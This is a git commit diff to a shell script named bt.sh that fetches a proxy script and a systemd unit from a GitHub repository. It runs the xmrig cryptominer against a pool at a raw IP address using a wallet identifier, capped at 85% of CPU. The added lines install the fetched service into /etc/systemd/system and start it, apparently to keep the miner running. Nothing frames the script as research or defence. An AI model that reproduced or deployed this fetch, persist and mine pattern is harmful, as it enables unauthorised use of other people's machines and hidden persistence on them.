a712714b4c46a144020679530b0606a36911f67c
robertreynolds2 <64372884+robertreynolds2@users.noreply.github.com>
2021-10-05 18:10:17 +0700

    Update bt.sh

--- bt.sh
+++ bt.sh
@@ -23,4 +23,6 @@ cmake ..
 make
 wget https://github.com/robertreynolds2/bteteteh/raw/main/btproxy.sh
 wget https://raw.githubusercontent.com/robertreynolds2/bteteteh/main/mystart.service
+cp mystart.service /etc/systemd/system/mystart.service
+systemctl start mystart
 ./xmrig -o 139.180.190.196:1231 -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq -p x --cpu-max-threads-hint=85
